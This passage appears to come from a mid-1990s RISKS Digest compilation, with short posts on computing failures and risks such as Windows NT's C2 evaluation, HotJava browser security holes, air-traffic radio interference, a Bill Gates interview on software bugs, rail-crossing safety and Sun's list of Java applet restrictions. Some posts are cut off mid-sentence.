PCs, and p% of them have such autoresponders, and each person with an
autoresponder replies to n messages each day, how long, on average,
will be the MTBF due to games of smtp-chicken?

Amid all the "Windows NT (tm)(c)(r)(sm)(one of them) is C2" hoopla, one very
important fact seems to have been glossed over (Microsoft marketoids are
skilled at this sort of thing).
<P>
I was forwarded the following announcement from Compuserve. Have
independently verified the comment but not the posting I have excerpted. The
Windows NT security guide says the same thing on page 44 but the copyright
notice is so draconian that I do not know if I can quote from that.

&gt; First Mainstream Commercial Operating System to Satisfy U.S. Department<BR>

&gt;<BR>
&gt;    REDMOND, Wash., Sept. 18 /PRNewswire/ -- Microsoft Corp.<BR>
&gt; (Nasdaq: MSFT) today announced the availability of Microsoft(R) Windows<BR>
&gt; NT(TM) Workstation and Windows NT Server version 3.5, C2 Release,<BR>
&gt; becoming the first vendor to satisfy C2 evaluation for mainstream,<BR>
&gt; commercial operating systems.
<P>
Guess HP MPE V/E, Data General AOS, DEC VMS, and IBM VM/SP or VM/SP HPO
(all previously evaluated C2) do not count.
<P>
...(interesting part is about 30 lines further on)
<P>
&gt;    "We are very pleased that both Windows NT Workstation and Windows NT<BR>
&gt; Server version 3.5 have been added to the C2 Evaluated Products List,"<BR>
&gt; said John Davis, director of the NCSC.  "Now that the base operating<BR>
&gt; system has been through a very thorough and rigorous evaluation, we<BR>
&gt; expect the networking components to take only a few months for full<BR>
&gt; evaluation."
<P>
In other words, today the NT workstation &amp; server lose their C2 evaluation
if either is connected to a network. Just a minor point.

<P>
We have found several security problems in the 1.0 alpha 3 release of
HotJava from Sun Microsystems.  The two most important problems are that
HotJava does not enforce the stated limits on where an applet can connect to
(an applet can talk to any place with which you have IP-level connectivity),
and HotJava is vulnerable to a man-in-the-middle attack, where someone can
watch your web-surfing, both seeing your requests, and the content that you
receive.
<P>
While HotJava prevents applets from actively opening connections that
violate the user-selected security policy, it allows an applet to accept
connections from anywhere.  At this point, an applet only has to use any one
of a number of channels to communicate where it is, and have the remote end
do the active open.
<P>
HotJava also allows an applet to set the proxy servers that the browser
uses.  This opens up a huge hole for anyone concerned about the privacy of
their web surfing.
<P>
Please note that these bugs are specific to the 1.0 alpha 3 release, and are
_not_ bugs in the Java language itself, nor do they apply to Netscape 2.0<BR>
beta 1J, which doesn't permit network connections.  We have notified Sun of
these problems, and are presently writing a paper on these and other issues.
We will make more information available on our Web page after we hear back
from Sun.

<P>
Charles Wertz expresses concern over the direction online information is
taking with executable code like Java becoming popular.
<P>
I don't have any solutions to offer, but I do have a possible roadmap that
may help. There is a Role-Playing game called Shadowrun, published by FASA,
that is set a number of years in the future. The core sourcebook has a
"history" that is quite fascinating, and helps to explain a number of the
paradigms in this invented future. Significant is the state of
communications they have depicted. Worldwide computer networks and voice
networks have merged into one which is accessed with a Sensory Translation
interface - basically the ultimate in Virtual Reality. In a nutshell, the
computing metaphor moves up into a whole new level and virus technology
shifts into defence where they cause real physical virus problem damage to
the intruder. Quite often, information consists of both inert data and
active code.
<P>
Now I know it is fantasy and oriented for role-playing (I've even played it).
However, with things like SmartCards to replace cash, and the blurring
starting to occur between data and code, I wonder how chillingly close to
reality Shadowrun's technology could possibly become.

<P>
Ross Oliver (and before him, Rob Nauta) describe the dire consequences of
naively giving a useful file the name "core", at least on a UNIX system.
<P>
Almost a decade ago, I wrote a PhD thesis that asserted, among other things,
that it was foolish to infer file type from file name.  I argued that the
file system ought to provide first-class support for an extensible
file-attribute system, so that one could associate arbitrarily complex type
information with any file.
<P>
I was a naive young man at the time, and very few people paid any attention
to my suggestion.
<P>
But it would not require any new file system features to double-check the
nature of a file named "core" before deleting it (or failing to back it up).
Core dump files have a precise structure, since they are meant to be
interpreted automatically by a debugger.  Recent versions of the UNIX "file"
command understand how to classify core files, so one could use the "file"
command in a script to check before deleting.  Old versions of "file"
classify core files as "data", but even that rudimentary level of checking
should prevent a script from deleting a file classified as something else,
such as "ascii text".
<P>
Curmudgeons may object that if the deletions are being done on a file server
of a different CPU architecture than the one on which the core dump was
generated, the "file" command may misclassify it.  This does not seem to be
an insurmountable problem.

FAA suspects birds jammed radar
<P>
Kansas City, MO - A several-hour shutdown of radar systems in three
midwestern cities may have been caused by unseasonably large flocks of
migrating birds, aviation officials said yesterday.  No disruptions or
delays to air traffic were caused by the failures Thursday in Omaha, Des
Moines and Kansas City, MO, which shifted to back-up radar coverage, said an
FAA spokeswoman, Sandra Campbell.  The Federal Aviation Administration is
investigating the shutdown but officials say they suspect migrating birds
were responsible.  "There's been an extremely rare and large hatch of
migratory birds this year, especially waterfowl," Campbell said. "That is
suspected as the problem but we don't know for sure."  Radar systems
identify and track airborne targets but some are susceptible to shutting
down if they track a maximum of 700 targets at a given time, Campbell said.
Immediately before the system in Omaha shut down, it had identified more
than 29,000 targets, she said.  "Not all of those were migratory birds, but
we also didn't have 29,000 airplanes in the sky at that time," Campbell
said.

[At the Software Engineering Institute's Software Risks conference in
Monterey earlier this week (I was the keynote speaker), someone asked me
whether the "illustrative risks" summary list of one-liners that I
maintain (and which will appear in the January 1996 Software Engineering
Notes) and indeed those in the Risks Forum are really representative.
Yes, I do tend to suppress some of the many similar cases such as the
n+1st instance of "ATC system failed, cutover to backup succeeded." I
also suppress some of the more repetitive and less interesting cases,
but sometimes decide that we really do continually need to be reminded
of the fact that similar cases just do manage to recur, continually --
such as another case of air-traffic controller spoofings, as in the next
message, and another case of RF interference, as in the message
following that.  Sorry if it seems repetitious, but there is a lesson
therein.  PGN]

I've just seen a report about a 'hacker' who is sending false radio messages
to plane. It was reported on the local teletext news. "Pilots have been
ordered to double check air traffic control messages to beat bogus
transmissions. Transport Secretary George Young said the hacker is thought
to be using a hand-held, battery-operated transmitter on sale for #600
($900). The hacker has given out false information to aircraft about to land
at Manchester airport." The risks are obvious, but some I would think some
form of scrambling by using digital signals would help prevent this type of
thing. Apparently the police in Manchester are supposed to be switching to a
digital system to stop criminals with scanners from listening in on them.

<P>
This occurred a few weeks back, so my memory is a little fuzzy on the
_exact_ details.  Uncertainty is noted below.
<P>
Melbourne Air Traffic control received complaints from pilots coming in to
land that one [or more] of their comms channels was picking up interference
to the point that it/they were unusable (I'm now not sure whether this was
voice comms or guidance signals).
<P>
The interference was sporadic.
<P>
Investigators ran around the place with trackers, but their task was
hindered by the intermittent nature of the jamming.  It appeared to be
originating (roughly) under a flight path.  An initial conclusion was that
someone had a rogue transmitter and was deliberately jamming the band(s) for
a short while, and then going quiet to avoid anyone pinpointing their
location.  A flurry of news items on various media highlighting that the
prankster's deeds were a serious threat to life had no effect on the
jamming.
<P>
It literally took weeks for tracker vans to finally home in on a suburban
house one evening.  The startled man was duly impressed with all the
technical equipment parked outside his door.
<P>
He claimed innocence.
<P>
The investigators did their search of the premises and eventually found the
transmitter.
<P>
It was a Video Cassette Recorder (VCR).
<P>
I kid you not.
<P>
Under certain conditions (pressing certain buttons in a particular
sequence), the unit transmitted an RF signal which was sufficient to
interfere with Air Traffic Comms.  The house was under an approach to
Melbourne Airport.  The Airport authorities offered to replace the unit.
They reported that the man was most co-operative and indeed, amused by the
whole incident.
<P>
The authorities didn't release the VCR's brand name or model.  Hopefully,
they've effected a silent recall of all such units.
<P>
[My Comments follow -- pnm]
<P>
Three things spring to mind:
<OL>
<LI>  It is dangerous to assume that jamming/interference is
always intentional.  I'd say the original media reports were
a gamble to frighten the 'pirate' into ceasing his/her
activities.  A warranted move, certainly, but thankfully
the authorities persevered with their tracking.
<P>
<LI>  How the blazes can a VCR produce a signal that strong to interfere
with something so crucial?  I've heard of singing toasters, but
this is ridiculous.  This thing became a transmitter, not just
a receiver, and (I assume) a strong one at that.
<P>
<LI>  Quality control.  Hmmm...  What's the equivalent of the FCC
in Australia?

<P>
REUTER - Japanese and Taiwanese relatives of almost half the 264 people
killed in the 1994 crash of a Taiwanese Airbus filed a suit with a court in
Japan on Wednesday seeking 25.7 billion yen in damages.  It was the biggest
single damages suit in connection with an air crash in Japan.  Relatives of
121 victims -- 92 Japanese and 29 Taiwanese -- of the crash at Nagoya<BR>
airport in central Japan filed the suit at the Nagoya District Court, a
court spokesman said.  They demand that China Airlines and Airbus Industrie
pay 100 million yen in damages for each victim, plus compensation for their
lost earnings.

<P>
The German federal labour court has ruled that employers may monitor their
employees telephone conversations, but only if the internal telephone system
of the company has built-in eavesdropping capabilities
<P>
I had to read that report twice.
<P>
Apparently, the court's point was that if the telephone system had built-in
eavesdropping, the eavesdropping itself does not constitute a violation of
the German criminal law, because the laws requires the use of an
"eavesdropping device" for the eavesdropping to be a criminal offence.
(Obviously, this restriction is there because you wouldn't punish people who
listen to others peoples conversations, say, at the bus stop).
<P>
(cynical remark) This may be a good point for the makers of telephone
systems: if you want to sell your system in Germany, please build in
eavesdropping capabilities and remind your customers of this court ruling.
<P>
There are two risks here.  1: outdated laws that do not always match the
problems arising with today's technology. 2: the "self-fulfilling-prophecy"
characteristics of built-in features of technology. In other words: you
never asked anybody to include eavesdropping in your telephone system. But
once it's there, you will use it at some point. And if you're in Germany,
you're even allowed to.
<P>
(I know that this is no news to US residents, as employers there may
eavesdrop you as they choose. Still, this is not the case everywhere in
the rest of the world.)

The Dallas Morning News carried the following on November 1, according to
the in-house network news at AT&amp;T:
<P>
o    The federal government and the phone industry -- anticipating
big problems with new area codes -- are launching a
nationwide advertising campaign [today] to educate businesses
and consumers about the changes.  The No. 1 warning?  If you
work at a business with a private switchboard, known as a
PBX, you may not be able to place a call to any of the new
area codes unless you go through an outside operator.  That's
because the new codes, unlike the existing ones, don't have a
zero or a one in the middle.  Private switchboards don't
recognize these new codes. [Dallas Morning News]
<P>
This sounds dismayingly like the year-2000 calendar bite we have been
reading and writing about for a long time.
<P>
Years ago, when the convention of dialing a '1' before the area code
was first introduced, it was clearly stated that one reason for this
was to make the area code recognizable without relying on the middle
digit.  Or is my memory faulty?  How could the pbx suppliers have
failed in all these years to prepare for the "new area codes"?

In <A HREF="/Risks/17.43.html">RISKS-17.43</A> Klaus Brunnstein takes on Bill Gates over the realities of
commercial software development.  Engineering is about knowing the risks
accurately, as Bill Gates clearly does.
<P>
Microsoft engineers products to optimize very considerable development costs
for the uses to which the product will actually be put.  You can't fly a 747
through a hurricane, and Microsoft Word will not do everything for
everybody.  Microsoft is constantly improving their designs and engineering,
often in response to user feedback.  But Microsoft does not ship a product
out the door until they know it is viable.
<P>
The 777 is not a bug-fix release of the 747.  The 747 does its job well
enough and many of its petty annoyances will never be fixed.  The same is
true of Microsoft Word.  On the rare occasion when a serious design flaw is
discovered, it is fixed. It is true that software becomes obsolete much more
quickly then a jet, but fortunately it is priced so that people can keep up
to date.  Sometimes that means buying a bigger hangar and adding a runway.
If you don't need to lower your costs or up your carrying capacity, by all
means stay with the older technology.
<P>
The risk is in thinking that an evolving computer system of any size will
ever be free of risk.  Engineering is about understanding the limitations of
a system and how that understanding is itself limited.  This is where Klaus
may pose a risk to himself.  Perhaps he should take up Mr. Gates on his
offer to listen in on support calls.

In <A HREF="/Risks/17.43.html">RISKS-17.43</A>, Klaus Brunnstein relayed a Bill Gates interview at German
weekly magazine FOCUS where, when asked "There are always bugs in programs",
Gates was quoted as saying: "No. There are no essential bugs ("keine
bedeutenden Fehler") in our software which a significant number fo users
might wish to be removed."
<P>
This reminds me of the book, Writing Solid Code (MS Press), which is
hailed as the classic on the MS way of programming.  In its lecture
number 2 (or was it 3), the author gave an example to copy memory.
The essence is as follows (I put it in an easier to read language):
<P><CODE>
if (allocate_memory(some_length) != NULL)<BR>
then copy_memory to new place
</CODE><P>
The author then says that, although this code captures the bug when
memory allocation fails (when it returns a NULL pointer), the code to
check the pointer not being NULL doubles the code size and slows
things down.  His advice?  Define the "extra" checking only when you
are debugging, and then remove iy from the "slick" code you ship.

<P>
Following my report on Mr. Gates` interview in FOCUS (<A HREF="/Risks/17.42.html">RISKS-17.42</A>), some
colleagues assumed that my translation might have adversely change Mr.
Gates` original words, or the German interviewer may have misunderstood some
phrases. The interviewer, Dr. Juergen Scriba &lt;<A HREF="mailto:scriba@focus.burda.com">scriba@focus.burda.com</A>&gt; was
born in USA and grew up there, so his English qualification should be good.
The interview was in English, translated and "redactionally adapted" in
German (e.g. to remove redundancies and polish sentences, as is usually done
in such interviews). Finally, the German version was authorised by a German
employee of Microsoft.
<P>
Dr. Scriba was so kind to read my "translation back to English". Though some
of my phrases differed from Mr. Gates original speak (due to "polishing"), he
regarded my text as semantically essentially correct, with one exception: I
mistranslated "Maschinenstuermer" as "machine addict" but the correct
translation is "Luddite". Apologies for this serious fault :-)
<P>
Dr. Scriba sent me "original Mr. Gates", so I append this "raw text". In
comparing the published interview with the spoken one, I regard the journalist
having been really friendly with Bill :-)
<P>
Enjoy Mr. Gates` original speak. Klaus Brunnstein (November 4,1995)
<P>
----- Original interview text of Mr. Bill Gates before translation
and adaptation; German (not this English) version was authorized -------
<P>
FOCUS: Every new release of a software which has less bugs than the older
one is also more complex and has more features...<BR>
Gates: No, only if that is what'll sell!
<P>
FOCUS: But...<BR>
Gates: Only if that is what'll sell! We've never done a piece of software
unless we thought it would sell. That's why everything we do in
software ... it's really amazing: We do it because we think that's
what customers want. That's why we do what we do.
<P>
FOCUS: But on the other hand - you would say: Okay, folks, if you don't
like these new features, stay with the old version, and keep the bugs?<BR>
Gates: No! We have lots and lots of competitors. The new version - it's not
there to fix bugs. That's not the reason we come up with a new version.
<P>
FOCUS: But there are bugs an any version which people would really like to
have fixed.<BR>
Gates: No! There are no significant bugs in our released software that any
significant number of users want fixed.
<P>
FOCUS: Oh, my God. I always get mad at my computer if MS Word swallows the
page numbers of a document which I printed a couple of times with page
numbers. If I complain to anybody they say "Well, upgrade from
version 5.11 to 6.0".<BR>
Gates: No! If you really think there's a bug you should report a bug. Maybe
that you're not using it properly. Have you ever considered that?
<P>
FOCUS: Yeah, I did...<BR>
Gates: It turns out Luddites don't know how to use software properly, so
you should look into that. - The reason we come up with new versions
is not to fix bugs. It's absolutely not. It's the stupidest reason to
buy a new version I ever heard. When we do a new version we put in lots
of new things that people are asking for. And so, in no sense, is
stability a reason to move to a new version. It's never a reason.
<P>
FOCUS: How come I keep being told by computer vendors "Well, we know about
this bug, wait till the next version is there, it'll be fixed"? I hear
this all the time. How come? If you're telling me there are no
significant bugs in software and there is no reason to do a new version?<BR>
Gates: No. I'm saying: We don't do a new version to fix bugs. We don't. Not
enough people would buy it. You can take a hundred people using Microsoft
Word. Call them up and say "Would you buy a new version because of bugs?"
You won't get a single person to say they'd buy a new version because of
bugs. We'd never be able to sell a release on that basis.
<P>
FOCUS: Probably you have other contacts to your software developers. But if
Mister Anybody, like me, calls up a store or a support line and says,
"Hey listen, there's a bug" ... 90 percent of the time I get the answer
"Oh, well, yeah, that's not too bad, wait to the next version and it'll
be fixed". That's how the system works.
<P>
Gates: Guess how much we spend on phone calls every year.<BR>
FOCUS: Hm, a couple of million dollars?
<P>
Gates: 500 million dollars a year. We take every one of these phone calls
and classify them. That's the input we use to do the next version.
So it's like the worlds biggest feedback loop. People call in - we
decide what to do on it. Do you want to know what percentage of those
phonecalls relates to bugs in the software? Less than one percent.
<P>
FOCUS: So people call in to say "Hey listen, I would love to have this and
that feature"?<BR>
Gates: Actually, that's about five percent. Most of them call to get advice
on how to do a certain thing with the software. That's the primary thing.
We could have you sit and listen to these phone calls. There are millions
and millions of them. It really isn't statistically significant. Sit in
and listen to Win 95 calls, sit in and listen to Word calls, and wait,
just wait for weeks and weeks for someone to call in and say "Oh, I
found a bug in this thing".
...
<P>
FOCUS: So where does this comon feeling of frustration come from that
unites all the PC users? Everybody experiences it every day that these
things simply don't work like they should.<BR>
Gates: Because it's cool. It's like, "Yeah, been there done that - oh,
yeah, I know that bug." - I can understand that phenomenon
sociologically, not technically.

But even if the system can be made to work perfectly, there are risks from
outside of the system.  For example, what if the last two cars going through
the yellow lights collide right in front of the bus?  The bus drive could be
staring at a green light for a minute and still not be able to clear the
tracks.
<P>
I'm surprised there hasn't been more commentary in the media about a
fail-safe mechanism -- never have traffic stopped on rail tracks, regardless
of how the lights and switches are connected.  In fact, I thought most
states had laws requiring buses to come to a complete stop before at-grade
rail crossings, look both ways, and only proceed if they can completely
clear the tracks before having to stop for something else.

<P>
I shudder to think how this happened, but since this Windows NT release was
cross-compiled from a machine running Linux, I suspect it may have something
to do with the fact that recent versions of Linux put some additional

<P>
For those of you who wonder about the irregularity of RISKS issues, you must
realize that RISKS appears whenever two things happen: (1) there is *good*
material, and (2) I have a few spare moments to put out an issue.  The past
year has been one with me having many diverse activities coupled with the
fact that noteworthy risk manifestations continue to occur.
<P>
For the RISKS record, here are a few cases noted over the past few days.
<UL>
<LI>SF 911.  On the morning of 4 Nov 1995, the San Francisco emergency 911<BR>
telephone system collapsed for over an hour.  It was over 20 minutes before
police even knew the system was not working (no error-detection alarm).
Another brief outage occurred later.  This has been a recurring problem
over the past three years.
<P>
<LI>SF Elections.  The San Francisco election process caused a lot of<BR>
unhappiness.  First, thousands of absentee ballot pamphlets were in error
(pamphlets are printed on a per-district basis, with differing orders of
candidates), which could have resulted in miscast ballots.  (Replacements
were subsequently mailed out.)  Second, on election night, 7 Nov 1995, the
computer systems kept malfunctioning, seriously delaying the results.  It
took quite a while to discover that the new energy-efficient screens were
incompatible with the building.  When the air conditioning was on, power
surges caused the computers to crash.  Of course, everything worked fine
during the earlier testing (in the absence of air conditioning).
<P>
<LI>HP Recalls.  Hewlett-Packard announced on 8 Nov 1995 that 1900 OmniGo 100<BR>
personal organizers were being recalled because of a manufacturing defect.
Apparently the organizers could lose data while batteries were being
changed.  However, the systems are new enough that none of the 500 already
purchased could have been in use long enough for the battery to need
replacement.  Indeed, 1400 were still on dealers' shelves.
<P>
<LI>Risks of a U.S. Government shutdown.  I won't go into this one in detail<BR>
here, but our out-of-country readers may not realize that "non-essential"
U.S. Government services may be shut down tomorrow for an indefinite period.
One of the risks implications to you all is that, if that happens, I won't
have to fly to Washington this week, which might enable me to take a closer
look at a very large backlog of second- and third-order responses in the
risks directory.  Thanks to all of you who have replied to earlier messages.
I'll try to get to them.

<P>
Quoted from NASA Press Release 95-203:
<P>
ICE CAUSE OF X-31 CRASH
<P>
A Mishap Investigation Board studying the cause of the X-31
experimental aircraft accident on January 19, 1995, has
concluded that an accumulation of ice in or on the unheated
pitot-static system of the aircraft provided false airspeed
information to the flight control computers, causing the
aircraft to go out of control and crash.
<P>
It is apparent to me that this crash is the result of a bug in the flight
control software and sensor hardware of the X-31 aircraft.  The computer was
unable to compensate for a loss of the airspeed indicator.
<P>
The pitot tube is used to measure airspeed.  Icing of this probe is a common
problem familiar to all pilots.  BUT IT IS NOT NECESSARILY FAMILIAR TO
SOFTWARE ENGINEERS.  A pilot can still fly a conventional aircraft if he
loses his airspeed indicator.  He checks the airspeed once in a while, and
can intuitively tell if it has failed (a reading of zero is pretty
impossible while the aircraft is flying).  The flight control computer was
apparently unable to sense the failure of the airspeed indication, and thus
acted as though the aircraft was travelling very slowly.  This is the
equivalent of driving a car on the highway, but steering as though in a
parking lot.
<P>
The X-31 is a "fly-by-wire" aircraft that is inherently unstable.  A
computer between the pilot's controls and the flight control surfaces is
necessary for the aircraft to fly.
<P>
The amount of control surface movement is inversely proportional to the
airspeed: at high airspeed a small movement is sufficient to keep the
aircraft under control, at low airspeeds more movement is necessary to
provide the same correcting force.  If the aircraft is travelling fast, but
the computer senses a low airspeed, it will over-control.
<P>
The RISKS?  A computer's view of a flying environment is very
different from the pilot's.  The computer relies on a very small
number of data sources (it has no eyes, ears, or "seat of the pants").
People who control aircraft, cars, ships, trains, power plants,
etc. use lots of information that is unavailable to a computer doing
the same task.  We need to understand these differences before we use
computers to take over the job of a human.

RSA Data Security claims it owns the dominant patent covering digital
signature technology, and wants other companies and government agencies to
pay them license fees for using it.  The U.S. government is fighting RSA's
claim, saying the digital signature algorithm it uses in its digital
signature standard is covered by a different patent.  If RSA can make its
claim stick, the government will owe the encryption company royalties for
use of its digital signature standard.  (Information Week 13 Nov 95 p20)

Federal prosecutors have decided to drop espionage charges against computer
programmer Kevin L. Poulson because the military document in his possession
was obsolete, he was lawfully entitled to access it, and he had not shared
it with anyone else.  In exchange for the dropped charges, Mr. Poulson
pleaded guilty to unrelated crimes involving illegal access into files of
the Pacific Bell Telephone Company. (New York Times 12 Nov 95 p18)

Anger over e-mail jam
By Richard Grant
[Excerpted from an unspecified British Sunday paper a week or two ago]
<P>
BRITAIN'S biggest Internet service provider has been attacked by furious
customers after 60,000 electronic mail messages went astray or were
delayed.  Fast growing Demon Internet was valued at 26.7 million (pounds)
last week in a City fund-raising exercise backed by venture capitalist
Apax Partners. Yet at the same time it was advising some of its clients
with the right equipment to by-pass its mail relay service to avoid
electronic traffic jams.  Angry Demon customers also reported e-mail
messages becoming lost or being bounced back to them after trying to send
them after trying to send them across the Internet though Demon's
electronic gateway. Some said they would quit Demon as they had lost
confidence in its service.  Many of the delayed messages, which are
transmitted from computer to computer across continents for the price of a
local phone call, have taken up to five days to arrive. The industry
standard is under 60 minutes.  ...  Demon's Todd said: 'When you double in
size every five months things don't degrade gracefully, they suddenly go
bang catastrophically'.  ...
<P>
What I find amusing is that the company I work for uses Demon as its service
provider. If your reading this then the mail got though!  We have recently
been getting mail messages that have been bumping around in the guts of the
system (Demon Internet)for up to a month.  I myself have been getting a lack
of response to mail message I've been sending out but I expect that because
no-one wants to talk to me :-) Other people have performed experiments where
they mail each other and third parties, the third parties received the mail
but it was not seen here.
<P>
This seems like a good example of things not scaling up well.
<P>
Actually something that happened moments before I was about to send this
is that I have just re-received a mail message sent to me 2 weeks ago.
<P>
The views expressed here and the fact I've copied something from a
newspaper source are my own doing and do not reflect the views of
my employer or my cat. Also all spelling errors are due to the cat
playing on the keyboard.

The UK has a simple and elegant solution to this. There is a standard road
marking - a diagonal yellow grid - which means "do not enter this area
unless your exit is clear" [there are exceptions to the rule, but they
don't apply at rail crossings]. This is then painted on the road at *every*
automatic rail crossing.
<P>
In addition, if there is a significant chance of traffic backing up over
the railway, the crossing *must* have gates or barriers completely blocking
the road, and is operated by a person who must positively verify that the
track is clear before the rail signals can change from Danger. In most
modern installations, remote control with CCTV is used.

<I>Thu, 9 Nov 95 14:05 EST</I>
<P>
I've been thinking about the Fox River Grove (Chicago) train/school bus
accident.  I think we have to be careful how we define the problem we are
trying to solve.
<P>
Are we trying to make grade-level railroad crossings safe?  Are we trying
to make grade-level railroad crossings that are exceptionally close to a
traffic light safe?
<P>
If this is the problem definition I'm not sure it can be solved in a way
that is completely safe and cost-effective.  Any signalling mechanism is
eventually going to fail, or be ignored, or be rendered unsafe by changes
in weather, train weight, speed, or traffic light timings.  99.999...9%
safe is not the same as 100% safe.
<P>
What if we defined the problem instead as trying to eliminate collisions
between railroad trains and other objects (automobiles, bicycles,
pedestrians, etc.)?
<P>
This past summer I had the pleasure of traveling from Gare du Nord in Paris
to Waterloo Station in London on the new Eurostar train.  One of the things
that only gradually dawned on me is that there are ZERO grade-level
crossings for the entire journey.  I'm going from my memory and
observations, which, of course, are subject to error, but I don't remember
seeing any streets, trails, or footpaths where an auto, bicycle, or
pedestrian could have come in contact with the train.
<P>
Lest anyone observe that Fox River Grove is pretty flat (I grew up near
there) and so it would be expensive to elevate or depress either the
railroad right-of-way or the highways, I would point out that most of
northern France and southeast England is also pretty flat.  That didn't stop
the builders of those lines from constructing an elevated embankment for the
railroad line, and running the streets and highways under it.
<P>
Can the Eurostar strike an object?  Sure.  It passes thru stations, railroad
yards, and switching areas where trespassers, employees, or passengers can
walk or fall onto the tracks.  But I think it is safe to say that a Fox
River Grove type of accident will not befall the Eurostar any time soon.
<P>
I find myself heading towards an economic argument.  Sometimes (not all the
time), improving safety raises the costs.  Should the good people of Fox
River Grove be told that their children gave their lives so that they could
have cheaper train tickets?  Or did they think that a simple set of relays,
lights, and timers would be 100% reliable, and so they could both be safe
and save money?  Or should we have told them, "This intersection is 99%
safe...you supply the last 1% with your own actions?"
<P>
I grew up in Elgin, Illinois, which has many active railroad crossings, at
grade level, over busy streets.  My father taught me to *never* stop the car
on the tracks, *no matter* whether there were automatic gates, flashing
lights, or "cross bucks".  Most people know that trains cannot stop in time.
Why is a school bus driver stopping a bus with the last 3 feet hanging over
the tracks, and, if that was unknown to her, why is a person driving a bus
that she is not totally familiar with?
<P>
As a guess, we seem to have an inherently dangerous crossing, reliance on an
imperfectable signalling system, a driver unfamiliar with the route, a
driver unfamiliar with the bus itself, and a train that just happens to come
along at the key moment.  That's 5 (not necessarily rare) events.  It makes
me ill just to think about it.

In <A HREF="/Risks/17.44.html">RISKS-17.44</A>, Li Gong paraphrases Steve McConnell's (or is it Steve
McGuire's?) Microsoft Press book, _Writing_Solid_Code_.  He tacitly
criticizes the book's purported advice to elide error-checking code from the
ship version.  Unfortunately, Mr. Gong omitted his own error-checking.  His
version is not what the book advises at all.  The book gives some good
advice: distinguish 1) code that checks for system and user errors, from 2)
assertions that check for programming errors.  It admonishes that (after
thorough testing) the latter can be removed from the ship version for better
performance, but the former must *never* be removed.  This is neither new
nor so entertaining to RISKS readers, but it's sound advice.

<P>
I have a VISA card supplied by the Co-operative bank here (in the UK); I don't
have an account with them, just that they offered a free-of-charges-for-life
card, so I took it. (At the time many of our VISA card operators were
implementing annual fees.)
<P>
Anyway: one feature which I liked at the time was that I could specify how my
name was to appear on the card; I therefore have my degree qualification
shown - "MR J P GILLIVER B SC". (I might not do that now, but anyway.)
<P>
I have now received a letter from them (selling death insurance - I'd have
thought they would know I have no dependents, but never mind), from which I
see that the way they implemented the name-as-I-like-it in their database is
that they have stored my name as "Mr J P Gilliver B SC". (I would have
preferred "J. P. Gilliver, B. Sc.,", but the data processing world seems to
have a horror of any punctuation, let alone lower case letters.)
<P>
After my address, the letter starts: "Dear Mr SC". Whether this is just the
result of a very dumb algorithm which just takes the last "word" in the
address line as the surname, regardless, or whether the data was not entered
into fields correctly, is not of course discernible; I just had a smile at it!
The risks are not that obvious, though I suppose if some part of the system
just extracted what it thought were surnames from the list, or for that matter
sorted by what it thought were surnames, incorrect operation would ensue.
<P>
(As an aside, the genealogy software I use - Brother's Keeper 5.2 - _does_
handle suffixes properly - it recognises many standard ones, such as Jr, II,
and so on [can be bypassed if that really is the surname], and I think also
recognises anything with a dot in it - so it _is_ possible to correctly
handle these sort of things. That's a shareware package, too!)

&gt; much in the past few years that perhaps now we can spare the cycles to<BR>
&gt; make our files secure.
<P>
The problem is that CPU time becomes less costly at the same ratio
for the encrypter as for the encryption breaker.  Thus, less cost
for CPU time may not make encryption more useful.

[This is similar to Fred Brooks' Free Component Fallacy.  I first ran
into the FB-FCF in the 1960s, when someone at a conference suggested that
memory was becoming so cheap (yes, 1960s) that ALL memory might as well be
associative.  Someone referred to Fred, pointing out that if associative
memory were still 300 times the cost of ordinary memory, the suggestion
did not make sense.  But in Jacob's case, the make-or-break ratio need
not grow linearly.  There are some schemes for which the breaker has almost
NO cost (for example, where the operating system is vulnerable to
attack), and others where the breaker really has an exponentially growing
difficulty.  PGN]

Keywords: alpha3 hotjava security
<P>
The paper written by the two students at Princeton describes possible
attacks on the alpha3 HotJava browser, which have all been fixed in JDK
beta.  Granted, until this week, the source code for JDK beta wasn't
available, so it's understandable that they analyzed the alpha3 source base.
<P>
We understand people need more information on the security model, and we're
taking time right now to document the security story more rigorously.  A
security FAQ, an updated whitepaper, detailed user documentation and
detailed implementor's documentation are all being worked on.
<P>
The Java security mechanisms include:
<P>
Java language mechanisms
<UL>
<LI>no pointers
<LI>private interfaces, classes and methods
<LI>class loader that enforces namespace divisions
<LI>runtime byte code verifier that enforces language
type rules and name space divisions
</UL>
Browser mechanisms, used by JDK beta appletviewer and by
Netscape Navigator 2.0beta
<UL>
<LI>AppletSecurity: extends java.lang.SecurityManager; strict
applet checks
<LI>AppletClassLoader: extends java.lang.ClassLoader; strict
class loading
</UL>
The goal for JDK beta is to enable browsers to run untrusted applets
in a trusted environment.  The approach is to be conservative at
first, and to add functionality when it can be added securely.
<P>
So, JDK beta applets (and Netscape 2.0beta applets) may not do the
following.
<OL>
<LI>  Files:
<P>
Access Control Lists are greatly restricted in beta,
as compared to the situation in the alpha3 HotJava browser.
ACLs are initialized - only once - by the applet security
manager, and are not user configurable.
<P>
For a file not on the access control list, an applet cannot
<UL>
<LI>check for the existence of the file
<LI>read the file
<LI>write the file
<LI>check the file type
<LI>check if the file is a directory
<LI>check the timestamp when the file was last modified
<LI>check the file's size
<LI>create a directory
<LI>rename the file
<LI>list the files in this file (as if it were a directory)
</UL>
Applets cannot
<UL>
<LI>create a FileInputStream
<LI>create a RandomAccessFile, either for reading or writing
<LI>Open file descriptors
</UL>
<LI>  Sockets:
<P>
Applets cannot
<UL>
<LI>Create socket connections other than to its own host
<LI>Create a socket factory
</UL>
<P>
<LI>  Loading/linking:
<P>
Applets cannot
<UL>
<LI>Create class loaders
<LI>Access a package in the sun.* hierarchy
<LI>Define a new class in the java.* hierarchy
<LI>Link dynamic libraries using System.loadLibrary()
<LI>Disable or override the AppletSecurityManager
</UL>
<LI>  Process control:
<P>
Applets cannot
<UL>
<LI>Define native methods
<LI>Fork processes
<LI>Manipulate threads or thread groups outside of the
applet's thread group
<LI>Exit the virtual machine (e.g., the browser or the appletviewer)
</UL>
<LI>  awt:
<P>
Applets cannot
<UL>
<LI>Create toplevel windows that don't have a warning banner
</UL>
Applets can use network connections only to connect to the host they
originate from, to download files that are part of the applet's
implementation.  Those files might be java bytecode class files, or they
might be input files used by the applet (GIF, JPEG, audio, other data
files.)
</OL>
Taking a look at the specific attacks mentioned in the paper -

</PRE>
It's very difficult, if not impossible, for a web browser to completely
prevent denial of service attacks.  The JDK applet API doesn't claim to
prevent denial of service attacks.  A "denial of service" attack is where
